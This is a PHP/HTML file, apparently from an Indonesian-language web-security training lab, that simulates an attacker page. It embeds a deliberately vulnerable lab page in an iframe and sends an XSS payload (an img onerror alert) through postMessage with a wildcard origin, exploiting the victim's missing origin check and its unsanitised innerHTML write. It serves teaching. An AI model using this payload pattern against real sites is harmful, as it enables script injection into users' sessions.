<?php
// Halaman ini mensimulasikan situs attacker eksternal - bukan bagian dari
// alur normal aplikasi, dan sengaja tidak dipasang di navigasi (header.php)
// karena secara konsep halaman ini "bukan milik" aplikasi ini. Halaman ini
// meng-embed lab10_postmessage_xss.php di dalam iframe lalu mengirim payload
// XSS lewat postMessage() ke iframe tersebut memakai target origin '*' -
// meniru attacker yang tidak perlu tahu origin korban sama sekali karena
// halaman korban tidak pernah memvalidasi event.origin.
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<title>Attacker PoC - postMessage XSS</title>
<style>
  body { font-family: Arial, Helvetica, sans-serif; margin: 0; background: #1f2937; color: #fff; }
  .wrap { max-width: 900px; margin: 40px auto; padding: 20px; }
  .banner { background: #111827; border: 2px dashed #ef4444; border-radius: 10px; padding: 24px; }
  .banner h1 { color: #f87171; margin-top: 0; }
  iframe.target-frame { width: 100%; height: 300px; border: 2px solid #374151; border-radius: 6px; background: #fff; }
  .note { font-size: 13px; color: #fca5a5; background: #450a0a; border: 1px solid #7f1d1d; padding: 10px; border-radius: 6px; margin-top: 20px; }
  code { background: #374151; padding: 2px 6px; border-radius: 4px; }
</style>
</head>
<body>
<div class="wrap">
  <div class="banner">
    <h1>Situs Attacker (simulasi)</h1>
    <p>Halaman ini meng-embed <code>lab10_postmessage_xss.php</code> di dalam iframe, lalu
    mengirim pesan lewat <code>postMessage()</code> dengan target origin <code>'*'</code> —
    tidak perlu tahu origin korban sama sekali karena halaman korban tidak pernah
    memvalidasi <code>event.origin</code>.</p>
    <iframe class="target-frame" id="target" src="lab10_postmessage_xss.php"></iframe>
    <p class="note">
      [Untuk lab] Di dunia nyata, halaman ini di-hosting sepenuhnya di domain lain. Begitu
      iframe di atas selesai dimuat, script di bawah mengirim
      <code>&lt;img src=x onerror=alert(document.domain)&gt;</code> lewat
      <code>postMessage</code>. Karena <code>lab10_postmessage_xss.php</code> menulis
      <code>event.data</code> langsung ke <code>innerHTML</code> tanpa cek origin maupun
      sanitasi, popup <code>alert()</code> akan muncul <strong>di dalam iframe</strong> di
      atas begitu payload diterima.
    </p>
  </div>
</div>

<script>
  var iframe = document.getElementById('target');
  iframe.addEventListener('load', function() {
    iframe.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>', '*');
  });
</script>
</body>
</html>
